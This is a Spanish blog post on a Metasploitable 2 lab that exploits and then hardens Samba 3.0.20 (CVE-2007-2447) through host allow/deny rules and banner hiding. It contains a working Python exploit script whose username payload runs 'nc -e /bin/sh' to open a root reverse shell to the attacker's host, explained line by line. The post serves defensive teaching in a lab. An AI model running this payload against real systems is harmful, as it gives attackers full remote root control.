---
layout: metasploitable2-post
title: "Metasploitable 2 - Hardening Samba"
date: 2026-06-29
img: /assets/img/metasploitable2/banner.png
tags: [Vuln, Linux, Hardening, Samba, root, Metasploitable 2]
---

Este es un nuevo proyecto de Hardening para el laboratorio **Metasploitable2**. Este laboratorio es conocido por tener múltiples vulnerabilidades que como atacante podemos sacar provecho y comprometer la máquina. Pero esta vez nos pondrémos en los zapatos del equipo defensivo y aplicaremos configuraciones correctas para volver Metasploitable 2 una máquina segura.

**Los objetivos del proyecto serán:**

* Reducir la superficie de ataque.
* Corregir fallas de configuración.
* Implementar contramedidas.
* Validar la postura de seguridad.

**Metodología:**

* Inspección y validación de la vulnerabilidad. Remediación (Hardening).
* Validación de seguridad.
* Esta máquina tiene múltiples puertos y vulnerabilidades habilitados.
* Es por eso que iremos resolviéndolas por servicios por separado.

  # 139 - Netbios-ssn / Samba 3.0.20 #
  
![](/secnotes/assets/img/metasploitable2/5dc25849a4e4c2d87b177df5288677de_MD5.jpg)

Podemos ver que el en puerto 139 la máquina objetivo corre el servicio de `samba 3.0.20`. Este servicio tiene una vulnerabilidad asociada a **CVE-2007-2447**. El fallo ocurre porque Samba no sanitiza correctamente los nombres de usuarios que se le envían al iniciar sesión, permitiendo inyectar comandos a través de caracteres especiales si hay un script de mapeo activo.

## Explotación ##

Para explotar este servicio deberemos crear un script en python (me ayudé con la IA, ya que realizarlo de manera manual no se pudo por los bloqueos de seguridad de las aplicaciones actualizadas)
```
#!/usr/bin/env python3
from impacket.smbconnection import SMBConnection

# Configuración del escenario
target_ip = "IP VÍCTIMA"     # IP de tu Metasploitable 2
kali_ip = "IP ATACANTE"      # Tu IP de Kali
kali_port = 443               # El puerto donde escucharás

# El payload con el prefijo /= que descubrimos en el código fuente
payload = f"/=`nohup nc -e /bin/sh {kali_ip} {kali_port} &`"

print(f"[*] Enviando inyección de comandos al puerto 139 de {target_ip}...")

try:
    # Abre la conexión pura al puerto 139
    conn = SMBConnection(target_ip, target_ip, sess_port=139)
    # Envía el payload en el campo de usuario para detonar la vulnerabilidad
    conn.login(payload, "password")
except Exception:
    # El servidor forzará un cierre de conexión al ejecutar el nc, esto es buena señal
    print("[+] Carga útil enviada. Revisa tu Netcat.")
```

## Explicación del Script ##

` from impacket.smbconnection import SMBConnection ` : Es el conjunto de librerías por excelencia en auditorías de red.

`SMBConnection`: En lugar de usar comandos del sistema como `smbclient` (que fue el causante de los errores al realizarlo de forma manual), esta clase nos permite construir una conexión SMB cruda. Nos da el poder de meter en el campo de "Nombre de usuario" cualquier carácter extraño que queramos, obligando al servidor a recibirlo exactamente como lo enviamos.

**La carga útil**

```
payload = f"/=`nohup nc -e /bin/sh {kali_ip} {kali_port} &`"
```

El prefijo `/=` Obliga al analizador de texto (parser) de Samba a romper la lógica normal de autenticación y a pasar el resto de la línea directamente a la consola interna del sistema operativo (de la víctima).

Comillas invertidas  `( " ` ") : En Linux, todo lo que esté dentro de comillas invertidas se ejecuta como un comando prioritario del sistema operativo.

`nohup... &` : Ejecuta la reverse shell de forma inmortal en segundo plano. Así, aunque falle la conexión SMB o se caiga el intento de login, el proceso de Netcat seguirá vivo corriendo hacia nuestra máquina.

**La inyección**

```
conn = SMBConnection(target_ip, target_ip, sess_port=139)
conn.login(payload, "password")
```

`sess_port=139`: abre un socket directo contra el puerto 139.

`conn.login()`: Esta es la línea que detona el hackeo. El protocolo SMB exige un nombre de usuario para iniciar sesión. Nosotros le pasamos nuestra variable `payload` como si fuera un nombre de usuario. 

## Qué pasa internamente en Metasploitable? ##

Al recibir la petición por el puerto 139, Samba consulta a su archivo de configuración y activa una directiva para mapear el usuario. 

Samba ejecuta una shell interna para procesar el script, pásandole el "nombre de usuario" que nosotros le dimos.

Al leer que empieza con `/=` y tiene comillas invertidas, la consola de Metasploitable ejecuta el comando inyectado `nc -e /bin/sh 192.168.1.29 443`.

El sistema operativo de la víctima ejecuta una terminal con los privilegios de quien ejecutó el servicio (Samba corre con privilegios de root), recibimos una shell de `root` en Netcat que teníamos en escucha.

![](/secnotes/assets/img/metasploitable2/a3183d6be749a41352570907a46771e4_MD5.jpg)

Ahora que tenemos una shell como root, al igual que los casos anteriores, tenemos control total de la víctima.

## Hardening ##

La mejor defensa consiste en limitar quién tiene permitido hablar con el protocolo SMB. Si el servicio no debe ser expuesto a toda la red, definimos una lista blanca estricta.

Para esto ubicamos el archivo de configuración de Samba.

` /etc/samba/smb.conf `

En este archivo añadimos las directivas para denegar todo el tráfico externo por defecto, permitiendo únicamente las IP de confianza (Por temas de laboratorio solo pondré la del localhost). 

```
[global]
   hosts allow = 127.0.0.1 192.168.1.29
   hosts deny = ALL
```

Ya que estamos en el archivo de configuración, vamos a ocultar el banner con la versión de Samba, así mitigaremos el reconocimiento pasivo.

![](/secnotes/assets/img/metasploitable2/4df21b475c01f0b204612865ec7f9759_MD5.jpg)
![](/secnotes/assets/img/metasploitable2/8b1745a45acfd05e0c3bfaea39fccc59_MD5.jpg)

Reiniciamos el servicio de Samba para aplicar los cambios.

`sudo /etc/init.d/samba restart`

![](/secnotes/assets/img/metasploitable2/3f59be42735f6ac3c54a933c05cf9386_MD5.jpg)
![](/secnotes/assets/img/metasploitable2/0170c0ca3b4c97453215a107ae4a5cb1_MD5.jpg)
![](/secnotes/assets/img/metasploitable2/08da2a6acf61bfd34e77487cb3e50f1e_MD5.jpg)

Con estas medidas ya no tenemos acceso por medio del script que escribimos en python, ni de forma manual con `smbclient`.  

## Avance 

| Puerto | Servicio     | Estado Inicial                                     | Estado Actual                         | Acción de Hardening                                                                                                                  |
| ------ | ------------ | -------------------------------------------------- | ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| 21     | FTP          | Abierto `vsftdp 2.3.4` (Acceso anónimo)            | Cerrado                               | Servicio deshabilitado en `xinetd`                                                                                                   |
| 22     | SSH          | Abierto                                            | Usado para gestionar Metasploitable 2 |                                                                                                                                      |
| 23     | Telnet       | Abierto (acceso en texto plano)                    | Cerrado                               | Línea comentada en `inet.conf` y memoria purgada                                                                                     |
| 25     | SMTP         | Abierto (Enumeración de usuarios `vrfy`)           | Bllindado                             | Directiva `disable_vrfy_command = yes`.                                                                                              |
| 53     | DNS          | Abierto (Versión expuesta `bind 9.4.2`)            | Blindado y Ofuscado                   | ACLs restrictivas y ocultamiento de banner con `version`.                                                                            |
| 80     | HTTP         | Abierto (Cargado con aplicaciones web vulnerables) | Blindado                              | Aplicación de configuraciones de seguridad (Ocultar banner, desactivar listado de directorios, deshabilitar métodos HTTP inseguros). |
| 111    | RCPBIND      | Abierto (`portmap` y `nfs` Vulnerables)            | Blindado                              | Aplicación de configuraciones de seguridad sobre NFS y controlar el acceso por Red con TPC Wrappers.                                 |
| 139    | Samba 3.0.20 | Abierto (CVE-2007-2447)                            | Ofuscado                              | Directivas `hosts allow = 127.0.0.1` / `hosts deny = ALL` y remoción de variables `%h` / `%v` en `server string`.                    |

